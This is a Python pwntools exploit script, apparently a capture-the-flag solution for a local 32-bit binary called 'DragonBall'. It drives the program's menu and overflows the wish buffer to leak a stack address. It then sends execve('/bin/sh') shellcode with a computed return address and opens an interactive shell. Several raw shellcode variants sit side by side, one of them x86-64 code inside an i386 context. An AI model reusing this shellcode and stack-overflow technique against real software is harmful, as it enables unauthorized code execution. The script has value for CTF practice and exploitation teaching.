from pwn import *
context(log_level='debug',arch='i386',os='linux')
p=process('./DragonBall')
elf=ELF('./DragonBall')
gdb.attach(p,'''
	break *0x080487C0
	break *0x08048791
	continue
''')

def buy():
	p.recvuntil('You choice: ')
	p.sendline('1')

def sell():
	p.recvuntil('You choice: ')
	p.sendline('2')

def list():
	p.recvuntil('You choice: ')
	p.sendline('3')

#def wish():
#	p.recvuntil('You choice: ')
#	p.sendline('4')
#	p.recvuntil('Tell me your wish: ')
#	p.sendline('a'*0x68)
#	p.recvuntil('a'*0x68)
#	a=(u32(p.recv(4)))
#	p.recvuntil('(Y/N) ')
#	p.sendline(asm(shellcraft.sh())+(0x3c-len(asm(shellcraft.sh())))*'c'+p32(0x1234))
#
#def exit():
#	p.recvuntil('You choice: ')
#	p.sendline('5')

buy()
sell()
buy()
buy()
buy()
buy()
buy()
buy()
buy()
p.recvuntil('You choice: ')
p.sendline('4')
p.recvuntil('Tell me your wish: ')
p.sendline('a'*0x67)
p.recvuntil('a'*0x67)
a=(u32(p.recv(4)))
a='0xff'+(hex(a).replace('0x',''))[0:6]
print a
a=int(a,16)
p.recvuntil('(Y/N) ')
shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
shellcode='jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
shellcode='\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
shellcode='\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'
#shellcode=asm(shellcraft.sh())
leng=len(shellcode)
#p.sendline((shellcode)+(0x3c-len((shellcode)))*'c'+p32(0x1234))
p.sendline(shellcode+'a'*(0x3c-leng)+p32(a-0x58))

p.interactive()
